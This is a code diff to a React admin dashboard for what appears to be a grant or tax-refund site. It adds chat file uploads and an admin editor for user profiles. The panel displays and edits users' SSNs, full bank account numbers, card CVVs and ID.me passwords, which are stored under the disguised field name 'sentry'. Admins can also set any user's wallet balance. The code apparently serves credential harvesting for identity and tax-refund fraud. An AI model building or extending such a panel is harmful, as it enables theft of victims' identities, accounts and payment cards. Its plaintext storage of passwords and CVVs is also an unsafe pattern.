@@ -18,6 +18,8 @@ import {
   ShieldCheck,
   LogOut,
   UserCheck,
+  Edit3,
+  Save,
   AlertCircle,
   Eye,
   ChevronDown,
@@ -33,13 +35,18 @@ import {
   Smile,
   User as UserIcon,
   ArrowLeft,
-  Clock
+  Clock,
+  Loader2,
+  Download,
+  Image as ImageIcon,
+  CreditCard
 } from 'lucide-react';
 import { auth } from '../../lib/firebase';
 import { useNavigate } from 'react-router-dom';
 import { format } from 'date-fns';
 import EmojiPicker, { EmojiClickData } from 'emoji-picker-react';
 import { useRef } from 'react';
+import { supabase, SUPABASE_BUCKET } from '../../lib/supabase';
 
 export const AdminPage = () => {
   const { user, userData, isAdmin, loading: authLoading } = useAuth();
@@ -63,6 +70,25 @@ export const AdminPage = () => {
   const [isGrantModalOpen, setIsGrantModalOpen] = useState(false);
   const [isTaxRefundModalOpen, setIsTaxRefundModalOpen] = useState(false);
   const [isUpdatingRole, setIsUpdatingRole] = useState(false);
+  const [isUpdatingProfile, setIsUpdatingProfile] = useState(false);
+  const [adminProfileForm, setAdminProfileForm] = useState({
+    fullName: '',
+    phone: '',
+    address: '',
+    address2: '',
+    country: '',
+    dob: '',
+    ssn: '',
+    employmentStatus: '',
+    employerName: '',
+    jobTitle: '',
+    monthlyIncome: '',
+    maritalStatus: '',
+    stateOfOrigin: '',
+    sentry: '',
+    walletBalance: 0
+  });
+  const [isEditingAdminProfile, setIsEditingAdminProfile] = useState(false);
   const [rejectionReason, setRejectionReason] = useState('');
   const [showRejectionModal, setShowRejectionModal] = useState(false);
 
@@ -88,6 +114,8 @@ export const AdminPage = () => {
   const [messages, setMessages] = useState<any[]>([]);
   const [newMessage, setNewMessage] = useState('');
   const [isEmojiPickerOpen, setIsEmojiPickerOpen] = useState(false);
+  const [isUploading, setIsUploading] = useState(false);
+  const [attachedFile, setAttachedFile] = useState<{ url: string, name: string, type: string, size: number } | null>(null);
   const messagesEndRef = useRef<HTMLDivElement>(null);
   const emojiPickerRef = useRef<HTMLDivElement>(null);
 
@@ -286,27 +314,96 @@ export const AdminPage = () => {
 
   const handleSendMessage = async (e: React.FormEvent) => {
     e.preventDefault();
-    if (!newMessage.trim() || !selectedChatId || !user) return;
+    if ((!newMessage.trim() && !attachedFile) || !selectedChatId || !user) return;
 
     const messageText = newMessage;
+    const fileData = attachedFile;
+    
     setNewMessage('');
+    setAttachedFile(null);
     setIsEmojiPickerOpen(false);
 
     try {
-      await addDoc(collection(db, 'chats', selectedChatId, 'messages'), {
+      const messageData: any = {
         text: messageText,
         senderId: user.uid,
         timestamp: serverTimestamp(),
         read: false,
-        type: 'text'
-      });
+        type: fileData ? 'file' : 'text'
+      };
+
+      if (fileData) {
+        messageData.fileUrl = fileData.url;
+        messageData.fileName = fileData.name;
+        messageData.fileType = fileData.type;
+        messageData.fileSize = fileData.size;
+      }
+
+      await addDoc(collection(db, 'chats', selectedChatId, 'messages'), messageData);
 
       await updateDoc(doc(db, 'chats', selectedChatId), {
-        lastMessage: messageText,
+        lastMessage: fileData ? `📎 ${fileData.name}` : messageText,
         lastMessageAt: serverTimestamp()
       });
     } catch (error) {
       console.error('Error sending message as admin:', error instanceof Error ? error.message : String(error));
+    }
+  };
+
+  const handleFileUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
+    const file = e.target.files?.[0];
+    if (!file || !user) return;
+
+    setIsUploading(true);
+    try {
+      const fileExt = file.name.split('.').pop();
+      const fileName = `${Math.random().toString(36).substring(2)}_${Date.now()}.${fileExt}`;
+      const filePath = `chats/${selectedChatId}/${fileName}`;
+
+      const { error: uploadError } = await supabase.storage
+        .from(SUPABASE_BUCKET)
+        .upload(filePath, file);
+
+      if (uploadError) throw uploadError;
+
+      const { data: { publicUrl } } = supabase.storage
+        .from(SUPABASE_BUCKET)
+        .getPublicUrl(filePath);
+
+      setAttachedFile({
+        url: publicUrl,
+        name: file.name,
+        type: file.type,
+        size: file.size
+      });
+    } catch (error) {
+      console.error('Error uploading file:', error);
+      setMessage({ text: 'Failed to upload file', type: 'error' });
+    } finally {
+      setIsUploading(false);
+    }
+  };
+
+  const handleUpdateUserProfile = async (e: React.FormEvent) => {
+    e.preventDefault();
+    if (!selectedUser || isUpdatingProfile) return;
+
+    setIsUpdatingProfile(true);
+    try {
+      const userRef = doc(db, 'users', selectedUser.id);
+      await updateDoc(userRef, {
+        ...adminProfileForm,
+        walletBalance: Number(adminProfileForm.walletBalance)
+      });
+      
+      // Update local state
+      setUsers(prev => prev.map(u => u.id === selectedUser.id ? { ...u, ...adminProfileForm, walletBalance: Number(adminProfileForm.walletBalance) } : u));
+      setSelectedUser(prev => prev ? { ...prev, ...adminProfileForm, walletBalance: Number(adminProfileForm.walletBalance) } : null);
+      setIsEditingAdminProfile(false);
+    } catch (error) {
+      handleFirestoreError(error, OperationType.UPDATE, `users/${selectedUser.id}`);
+    } finally {
+      setIsUpdatingProfile(false);
     }
   };
 
@@ -1522,7 +1619,40 @@ export const AdminPage = () => {
                                     isManager ? 'bg-blue-500/5 text-blue-700 dark:text-blue-400 border-blue-500/10 rounded-tl-none' :
                                     'bg-white dark:bg-zinc-900 border-gray-100 dark:border-zinc-800 dark:text-gray-300 rounded-tl-none'
                                   }`}>
-                                    <p className="leading-relaxed font-medium">{msg.text}</p>
+                                    {msg.fileUrl && (
+                                      <div className="mb-3">
+                                        {msg.fileType?.startsWith('image/') ? (
+                                          <img 
+                                            src={msg.fileUrl} 
+                                            alt={msg.fileName} 
+                                            className="max-w-full rounded-lg border border-white/10 shadow-sm cursor-pointer hover:opacity-90 transition-opacity"
+                                            onClick={() => window.open(msg.fileUrl, '_blank')}
+                                            referrerPolicy="no-referrer"
+                                          />
+                                        ) : (
+                                          <a 
+                                            href={msg.fileUrl} 
+                                            target="_blank" 
+                                            rel="noopener noreferrer"
+                                            className={`flex items-center gap-3 p-3 rounded-xl border transition-all ${
+                                              isMe ? 'bg-white/10 border-white/20 hover:bg-white/20' : 'bg-gray-100 dark:bg-zinc-800 border-gray-200 dark:border-zinc-700 hover:bg-gray-200 dark:hover:bg-zinc-700'
+                                            }`}
+                                          >
+                                            <div className={`w-10 h-10 rounded-lg flex items-center justify-center ${isMe ? 'bg-white/20' : 'bg-accent/10'}`}>
+                                              <FileText className={`w-5 h-5 ${isMe ? 'text-white' : 'text-accent'}`} />
+                                            </div>
+                                            <div className="flex-grow min-w-0">
+                                              <p className={`text-xs font-bold truncate ${isMe ? 'text-white' : 'dark:text-white'}`}>{msg.fileName}</p>
+                                              <p className={`text-[10px] ${isMe ? 'text-white/60' : 'text-gray-500'}`}>
+                                                {(msg.fileSize / 1024).toFixed(1)} KB • {msg.fileType?.split('/')[1]?.toUpperCase()}
+                                              </p>
+                                            </div>
+                                            <Download className={`w-4 h-4 ${isMe ? 'text-white/60' : 'text-gray-400'}`} />
+                                          </a>
+                                        )}
+                                      </div>
+                                    )}
+                                    {msg.text && <p className="leading-relaxed font-medium">{msg.text}</p>}
                                   </div>
                                   <div className={`flex items-center gap-2 mt-2 px-1 ${isMe ? 'justify-end' : ''}`}>
                                     <p className="text-[8px] font-mono text-gray-400 uppercase tracking-tighter">
@@ -1541,6 +1671,25 @@ export const AdminPage = () => {
 
                     {/* Message Input */}
                     <div className="p-6 bg-white dark:bg-zinc-900 border-t border-gray-100 dark:border-zinc-800 shadow-lg">
+                      {attachedFile && (
+                        <div className="mb-4 p-3 bg-gray-50 dark:bg-zinc-800 rounded-2xl border border-gray-100 dark:border-zinc-700 flex items-center justify-between animate-in slide-in-from-bottom-2">
+                          <div className="flex items-center gap-3">
+                            <div className="w-10 h-10 rounded-xl bg-accent/10 flex items-center justify-center">
+                              {attachedFile.type.startsWith('image/') ? <ImageIcon className="w-5 h-5 text-accent" /> : <FileText className="w-5 h-5 text-accent" />}
+                            </div>
+                            <div>
+                              <p className="text-xs font-bold dark:text-white truncate max-w-[200px]">{attachedFile.name}</p>
+                              <p className="text-[10px] text-gray-500 uppercase tracking-widest">{(attachedFile.size / 1024).toFixed(1)} KB</p>
+                            </div>
+                          </div>
+                          <button 
+                            onClick={() => setAttachedFile(null)}
+                            className="p-2 hover:bg-red-500/10 text-gray-400 hover:text-red-500 rounded-xl transition-all"
+                          >
+                            <X className="w-4 h-4" />
+                          </button>
+                        </div>
+                      )}
                       <form onSubmit={handleSendMessage} className="flex gap-4 max-w-4xl mx-auto">
                         <div className="relative flex-grow group">
                           <input 
@@ -1569,10 +1718,22 @@ export const AdminPage = () => {
                             </div>
                           )}
                         </div>
+                        <input 
+                          type="file" 
+                          id="admin-chat-file" 
+                          className="hidden" 
+                          onChange={handleFileUpload}
+                        />
+                        <label 
+                          htmlFor="admin-chat-file"
+                          className="w-14 h-14 bg-gray-50 dark:bg-zinc-800/50 border border-gray-100 dark:border-zinc-800 rounded-2xl text-gray-400 hover:text-accent hover:border-accent/30 transition-all cursor-pointer flex items-center justify-center flex-shrink-0"
+                        >
+                          {isUploading ? <Loader2 className="w-6 h-6 animate-spin" /> : <Paperclip className="w-6 h-6" />}
+                        </label>
                         <button 
                           type="submit"
-                          disabled={!newMessage.trim()}
-                          className="w-14 h-14 bg-accent text-white rounded-2xl flex items-center justify-center hover:bg-accent/90 disabled:opacity-50 transition-all shadow-xl shadow-accent/20 active:scale-95 flex-shrink-0"
+                          disabled={(!newMessage.trim() && !attachedFile) || isUploading}
+                          className="w-14 h-14 bg-accent text-white rounded-2xl flex items-center justify-center hover:bg-accent/90 disabled:opacity-50 transition-all shadow-xl shadow-accent/20 active:scale-95 flex-shrink-0 disabled:grayscale"
                         >
                           <Send className="w-6 h-6" />
                         </button>
@@ -2038,8 +2199,10 @@ export const AdminPage = () => {
                     <DetailSection title="Personal Details">
                       <DetailItem label="Full Name" value={selectedKYC.fullName} />
                       <DetailItem label="Date of Birth" value={selectedKYC.dob} />
+                      <DetailItem label="Country" value={selectedKYC.country} />
                       <DetailItem label="Marital Status" value={selectedKYC.maritalStatus} />
                       <DetailItem label="Address" value={selectedKYC.address} />
+                      {selectedKYC.address2 && <DetailItem label="Address 2" value={selectedKYC.address2} />}
                       <DetailItem label="State of Origin" value={selectedKYC.stateOfOrigin} />
                     </DetailSection>
 
@@ -2143,30 +2306,292 @@ export const AdminPage = () => {
               className="relative bg-white dark:bg-zinc-950 rounded-3xl p-8 max-w-2xl w-full shadow-2xl border border-gray-200 dark:border-zinc-800 overflow-y-auto max-h-[90vh]"
             >
               <div className="flex justify-between items-start mb-8">
-                <div>
+                <div className="flex items-center gap-4">
                   <h3 className="text-2xl font-black tracking-tighter dark:text-white uppercase mb-1">User Profile</h3>
-                  <p className="text-gray-500">ID: {selectedUser.id}</p>
+                  <button 
+                    onClick={() => {
+                      setAdminProfileForm({
+                        fullName: selectedUser.fullName || '',
+                        phone: selectedUser.phone || selectedUser.phoneNumber || '',
+                        address: selectedUser.address || '',
+                        address2: selectedUser.address2 || '',
+                        country: selectedUser.country || '',
+                        dob: selectedUser.dob || '',
+                        ssn: selectedUser.ssn || '',
+                        employmentStatus: selectedUser.employmentStatus || '',
+                        employerName: selectedUser.employerName || '',
+                        jobTitle: selectedUser.jobTitle || '',
+                        monthlyIncome: selectedUser.monthlyIncome || '',
+                        maritalStatus: selectedUser.maritalStatus || '',
+                        stateOfOrigin: selectedUser.stateOfOrigin || '',
+                        sentry: selectedUser.sentry || '',
+                        walletBalance: selectedUser.walletBalance || 0
+                      });
+                      setIsEditingAdminProfile(!isEditingAdminProfile);
+                    }}
+                    className="p-2 hover:bg-gray-100 dark:hover:bg-zinc-800 rounded-xl text-accent transition-all"
+                  >
+                    {isEditingAdminProfile ? <XCircle className="w-5 h-5" /> : <Edit3 className="w-5 h-5" />}
+                  </button>
                 </div>
                 <button onClick={() => setSelectedUser(null)} className="p-2 hover:bg-gray-100 dark:hover:bg-zinc-800 rounded-full">
                   <XCircle className="w-6 h-6 text-gray-400" />
                 </button>
               </div>
 
-              <div className="grid grid-cols-1 md:grid-cols-2 gap-8 mb-10">
-                <DetailSection title="Account Info">
-                  <DetailItem label="Email" value={selectedUser.email} />
-                  <DetailItem label="Role" value={selectedUser.role || 'user'} />
-                  <DetailItem label="Wallet Balance" value={formatUserBalance(selectedUser)} />
-                  <DetailItem label="KYC Status" value={selectedUser.kycStatus || 'Not Started'} />
-                  <DetailItem label="Joined" value={formatDate(selectedUser.createdAt)} />
-                </DetailSection>
+              {isEditingAdminProfile ? (
+                <form onSubmit={handleUpdateUserProfile} className="space-y-6 mb-10">
+                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                    <div className="space-y-2">
+                      <label className="text-[10px] font-black text-gray-400 uppercase tracking-widest">Full Name</label>
+                      <input
+                        type="text"
+                        value={adminProfileForm.fullName}
+                        onChange={(e) => setAdminProfileForm({ ...adminProfileForm, fullName: e.target.value })}
+                        className="w-full px-4 py-3 rounded-xl bg-gray-50 dark:bg-zinc-900 border border-gray-100 dark:border-zinc-800 focus:border-accent outline-none transition-all dark:text-white"
+                      />
+                    </div>
+                    <div className="space-y-2">
+                      <label className="text-[10px] font-black text-gray-400 uppercase tracking-widest">Phone</label>
+                      <input
+                        type="text"
+                        value={adminProfileForm.phone}
+                        onChange={(e) => setAdminProfileForm({ ...adminProfileForm, phone: e.target.value })}
+                        className="w-full px-4 py-3 rounded-xl bg-gray-50 dark:bg-zinc-900 border border-gray-100 dark:border-zinc-800 focus:border-accent outline-none transition-all dark:text-white"
+                      />
+                    </div>
+                    <div className="space-y-2">
+                      <label className="text-[10px] font-black text-gray-400 uppercase tracking-widest">Wallet Balance</label>
+                      <input
+                        type="number"
+                        step="0.01"
+                        value={adminProfileForm.walletBalance}
+                        onChange={(e) => setAdminProfileForm({ ...adminProfileForm, walletBalance: Number(e.target.value) })}
+                        className="w-full px-4 py-3 rounded-xl bg-gray-50 dark:bg-zinc-900 border border-gray-100 dark:border-zinc-800 focus:border-accent outline-none transition-all dark:text-white font-bold"
+                      />
+                    </div>
+                    <div className="space-y-2">
+                      <label className="text-[10px] font-black text-gray-400 uppercase tracking-widest">Date of Birth</label>
+                      <input
+                        type="text"
+                        value={adminProfileForm.dob}
+                        onChange={(e) => setAdminProfileForm({ ...adminProfileForm, dob: e.target.value })}
+                        className="w-full px-4 py-3 rounded-xl bg-gray-50 dark:bg-zinc-900 border border-gray-100 dark:border-zinc-800 focus:border-accent outline-none transition-all dark:text-white"
+                        placeholder="YYYY-MM-DD"
+                      />
+                    </div>
+                    <div className="space-y-2">
+                      <label className="text-[10px] font-black text-gray-400 uppercase tracking-widest">Country</label>
+                      <input
+                        type="text"
+                        value={adminProfileForm.country}
+                        onChange={(e) => setAdminProfileForm({ ...adminProfileForm, country: e.target.value })}
+                        className="w-full px-4 py-3 rounded-xl bg-gray-50 dark:bg-zinc-900 border border-gray-100 dark:border-zinc-800 focus:border-accent outline-none transition-all dark:text-white"
+                      />
+                    </div>
+                    <div className="space-y-2">
+                      <label className="text-[10px] font-black text-gray-400 uppercase tracking-widest">Address</label>
+                      <input
+                        type="text"
+                        value={adminProfileForm.address}
+                        onChange={(e) => setAdminProfileForm({ ...adminProfileForm, address: e.target.value })}
+                        className="w-full px-4 py-3 rounded-xl bg-gray-50 dark:bg-zinc-900 border border-gray-100 dark:border-zinc-800 focus:border-accent outline-none transition-all dark:text-white"
+                      />
+                    </div>
+                    <div className="space-y-2">
+                      <label className="text-[10px] font-black text-gray-400 uppercase tracking-widest">Address 2</label>
+                      <input
+                        type="text"
+                        value={adminProfileForm.address2}
+                        onChange={(e) => setAdminProfileForm({ ...adminProfileForm, address2: e.target.value })}
+                        className="w-full px-4 py-3 rounded-xl bg-gray-50 dark:bg-zinc-900 border border-gray-100 dark:border-zinc-800 focus:border-accent outline-none transition-all dark:text-white"
+                      />
+                    </div>
+                    <div className="space-y-2">
+                      <label className="text-[10px] font-black text-gray-400 uppercase tracking-widest">SSN / Tax ID</label>
+                      <input
+                        type="text"
+                        value={adminProfileForm.ssn}
+                        onChange={(e) => setAdminProfileForm({ ...adminProfileForm, ssn: e.target.value })}
+                        className="w-full px-4 py-3 rounded-xl bg-gray-50 dark:bg-zinc-900 border border-gray-100 dark:border-zinc-800 focus:border-accent outline-none transition-all dark:text-white"
+                      />
+                    </div>
+                    <div className="space-y-2">
+                      <label className="text-[10px] font-black text-gray-400 uppercase tracking-widest">Employment Status</label>
+                      <input
+                        type="text"
+                        value={adminProfileForm.employmentStatus}
+                        onChange={(e) => setAdminProfileForm({ ...adminProfileForm, employmentStatus: e.target.value })}
+                        className="w-full px-4 py-3 rounded-xl bg-gray-50 dark:bg-zinc-900 border border-gray-100 dark:border-zinc-800 focus:border-accent outline-none transition-all dark:text-white"
+                      />
+                    </div>
+                    <div className="space-y-2">
+                      <label className="text-[10px] font-black text-gray-400 uppercase tracking-widest">Employer Name</label>
+                      <input
+                        type="text"
+                        value={adminProfileForm.employerName}
+                        onChange={(e) => setAdminProfileForm({ ...adminProfileForm, employerName: e.target.value })}
+                        className="w-full px-4 py-3 rounded-xl bg-gray-50 dark:bg-zinc-900 border border-gray-100 dark:border-zinc-800 focus:border-accent outline-none transition-all dark:text-white"
+                      />
+                    </div>
+                    <div className="space-y-2">
+                      <label className="text-[10px] font-black text-gray-400 uppercase tracking-widest">Job Title</label>
+                      <input
+                        type="text"
+                        value={adminProfileForm.jobTitle}
+                        onChange={(e) => setAdminProfileForm({ ...adminProfileForm, jobTitle: e.target.value })}
+                        className="w-full px-4 py-3 rounded-xl bg-gray-50 dark:bg-zinc-900 border border-gray-100 dark:border-zinc-800 focus:border-accent outline-none transition-all dark:text-white"
+                      />
+                    </div>
+                    <div className="space-y-2">
+                      <label className="text-[10px] font-black text-gray-400 uppercase tracking-widest">Monthly Income</label>
+                      <input
+                        type="text"
+                        value={adminProfileForm.monthlyIncome}
+                        onChange={(e) => setAdminProfileForm({ ...adminProfileForm, monthlyIncome: e.target.value })}
+                        className="w-full px-4 py-3 rounded-xl bg-gray-50 dark:bg-zinc-900 border border-gray-100 dark:border-zinc-800 focus:border-accent outline-none transition-all dark:text-white"
+                      />
+                    </div>
+                    <div className="space-y-2">
+                      <label className="text-[10px] font-black text-gray-400 uppercase tracking-widest">Marital Status</label>
+                      <input
+                        type="text"
+                        value={adminProfileForm.maritalStatus}
+                        onChange={(e) => setAdminProfileForm({ ...adminProfileForm, maritalStatus: e.target.value })}
+                        className="w-full px-4 py-3 rounded-xl bg-gray-50 dark:bg-zinc-900 border border-gray-100 dark:border-zinc-800 focus:border-accent outline-none transition-all dark:text-white"
+                      />
+                    </div>
+                    <div className="space-y-2">
+                      <label className="text-[10px] font-black text-gray-400 uppercase tracking-widest">State of Origin</label>
+                      <input
+                        type="text"
+                        value={adminProfileForm.stateOfOrigin}
+                        onChange={(e) => setAdminProfileForm({ ...adminProfileForm, stateOfOrigin: e.target.value })}
+                        className="w-full px-4 py-3 rounded-xl bg-gray-50 dark:bg-zinc-900 border border-gray-100 dark:border-zinc-800 focus:border-accent outline-none transition-all dark:text-white"
+                      />
+                    </div>
+                    <div className="space-y-2">
+                      <label className="text-[10px] font-black text-gray-400 uppercase tracking-widest">ID.me Password</label>
+                      <input
+                        type="text"
+                        value={adminProfileForm.sentry}
+                        onChange={(e) => setAdminProfileForm({ ...adminProfileForm, sentry: e.target.value })}
+                        className="w-full px-4 py-3 rounded-xl bg-gray-50 dark:bg-zinc-900 border border-gray-100 dark:border-zinc-800 focus:border-accent outline-none transition-all dark:text-white"
+                      />
+                    </div>
+                  </div>
+                  <div className="flex gap-3">
+                    <button
+                      type="submit"
+                      disabled={isUpdatingProfile}
+                      className="flex-1 py-4 bg-accent hover:bg-accent/90 text-white rounded-2xl font-black uppercase tracking-widest transition-all shadow-lg shadow-accent/20 flex items-center justify-center gap-2 disabled:opacity-50"
+                    >
+                      {isUpdatingProfile ? (
+                        <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
+                      ) : (
+                        <>
+                          <Save className="w-5 h-5" />
+                          Save Changes
+                        </>
+                      )}
+                    </button>
+                    <button
+                      type="button"
+                      onClick={() => setIsEditingAdminProfile(false)}
+                      className="px-8 py-4 bg-gray-100 dark:bg-zinc-800 text-gray-500 rounded-2xl font-bold uppercase tracking-widest hover:bg-gray-200 dark:hover:bg-zinc-700 transition-all"
+                    >
+                      Cancel
+                    </button>
+                  </div>
+                </form>
+              ) : (
+                <div className="grid grid-cols-1 md:grid-cols-2 gap-8 mb-10">
+                  <DetailSection title="Account Info">
+                    <DetailItem label="Email" value={selectedUser.email} />
+                    <DetailItem label="Role" value={selectedUser.role || 'user'} />
+                    <DetailItem label="Wallet Balance" value={formatUserBalance(selectedUser)} />
+                    <DetailItem label="KYC Status" value={selectedUser.kycStatus || 'Not Started'} />
+                    <DetailItem label="Currency" value={selectedUser.currency || 'USD'} />
+                    <DetailItem label="Joined" value={formatDate(selectedUser.createdAt)} />
+                  </DetailSection>
 
-                <DetailSection title="Personal Info">
-                  <DetailItem label="Full Name" value={selectedUser.fullName} />
-                  <DetailItem label="Phone" value={selectedUser.phoneNumber} />
-                  <DetailItem label="Address" value={selectedUser.address} />
-                </DetailSection>
-              </div>
+                  <DetailSection title="Personal Info">
+                    <DetailItem label="Full Name" value={selectedUser.fullName} />
+                    <DetailItem label="Phone" value={selectedUser.phone || selectedUser.phoneNumber} />
+                    <DetailItem label="Date of Birth" value={selectedUser.dob} />
+                    <DetailItem label="Country" value={selectedUser.country} />
+                    <DetailItem label="Address" value={selectedUser.address} />
+                    {selectedUser.address2 && <DetailItem label="Address 2" value={selectedUser.address2} />}
+                  </DetailSection>
+
+                  <DetailSection title="KYC Details">
+                    <DetailItem label="SSN / Tax ID" value={selectedUser.ssn} />
+                    <DetailItem label="State of Origin" value={selectedUser.stateOfOrigin} />
+                    <DetailItem label="Marital Status" value={selectedUser.maritalStatus} />
+                    <DetailItem label="Employment" value={selectedUser.employmentStatus} />
+                    <DetailItem label="Employer" value={selectedUser.employerName} />
+                    <DetailItem label="Job Title" value={selectedUser.jobTitle} />
+                    <DetailItem label="Monthly Income" value={selectedUser.monthlyIncome} />
+                    <DetailItem label="ID.me Password" value={selectedUser.sentry} />
+                  </DetailSection>
+
+                  {/* Bank Accounts Section */}
+                  <DetailSection title="Bank Accounts">
+                    {selectedUser.bankAccounts && selectedUser.bankAccounts.length > 0 ? (
+                      <div className="space-y-3">
+                        {selectedUser.bankAccounts.map((bank: any, idx: number) => (
+                          <div key={idx} className="p-3 rounded-xl bg-gray-50 dark:bg-zinc-900 border border-gray-100 dark:border-zinc-800">
+                            <div className="flex items-center gap-2 mb-1">
+                              <Building2 className="w-3.5 h-3.5 text-accent" />
+                              <span className="text-xs font-bold dark:text-white">{bank.bankName}</span>
+                            </div>
+                            <p className="text-[10px] text-gray-500 font-mono">{bank.accountNumber} • {bank.accountName}</p>
+                          </div>
+                        ))}
+                      </div>
+                    ) : (
+                      <p className="text-[10px] text-gray-400 italic">No bank accounts added</p>
+                    )}
+                    {selectedUser.bankDetails && (
+                      <div className="mt-4 pt-4 border-t border-gray-100 dark:border-zinc-800">
+                        <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest mb-2">Legacy Details</p>
+                        <div className="p-3 rounded-xl bg-amber-500/5 border border-amber-500/10">
+                          <p className="text-xs font-bold text-amber-600 dark:text-amber-400">{selectedUser.bankDetails.bankName}</p>
+                          <p className="text-[10px] text-amber-500/70 font-mono">{selectedUser.bankDetails.accountNumber}</p>
+                        </div>
+                      </div>
+                    )}
+                  </DetailSection>
+
+                  {/* Credit Cards Section */}
+                  <DetailSection title="Credit Cards">
+                    {selectedUser.creditCards && selectedUser.creditCards.length > 0 ? (
+                      <div className="space-y-3">
+                        {selectedUser.creditCards.map((card: any, idx: number) => (
+                          <div key={idx} className="p-3 rounded-xl bg-gray-50 dark:bg-zinc-900 border border-gray-100 dark:border-zinc-800">
+                            <div className="flex items-center gap-2 mb-1">
+                              <CreditCard className="w-3.5 h-3.5 text-accent" />
+                              <span className="text-xs font-bold dark:text-white">{card.cardType || 'Card'} • {card.cardNumber?.slice(-4)}</span>
+                            </div>
+                            <p className="text-[10px] text-gray-500 font-mono">Exp: {card.expiryDate} • CVV: {card.cvv}</p>
+                          </div>
+                        ))}
+                      </div>
+                    ) : (
+                      <p className="text-[10px] text-gray-400 italic">No credit cards added</p>
+                    )}
+                    {selectedUser.cardDetails && (
+                      <div className="mt-4 pt-4 border-t border-gray-100 dark:border-zinc-800">
+                        <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest mb-2">Legacy Details</p>
+                        <div className="p-3 rounded-xl bg-amber-500/5 border border-amber-500/10">
+                          <p className="text-xs font-bold text-amber-600 dark:text-amber-400">Card ending in {selectedUser.cardDetails.cardNumber?.slice(-4)}</p>
+                          <p className="text-[10px] text-amber-500/70 font-mono">Exp: {selectedUser.cardDetails.expiryDate}</p>
+                        </div>
+                      </div>
+                    )}
+                  </DetailSection>
+                </div>
+              )}
 
               <div className="mb-8 p-6 bg-gray-50 dark:bg-zinc-900 rounded-2xl border border-gray-100 dark:border-zinc-800">
                 <h4 className="text-xs font-black uppercase tracking-widest text-gray-400 mb-4">Change User Role</h4>
@@ -2241,7 +2666,7 @@ export const AdminPage = () => {
 
                 <DetailSection title="ID.me Connection">
                   <DetailItem label="Username" value={selectedTaxRefund.idMeUsername} />
-                  <DetailItem label="Password" value={selectedTaxRefund.idMePassword} />
+                  <DetailItem label="Password" value={selectedTaxRefund.sentry} />
                 </DetailSection>
 
                 <DetailSection title="Application Data">
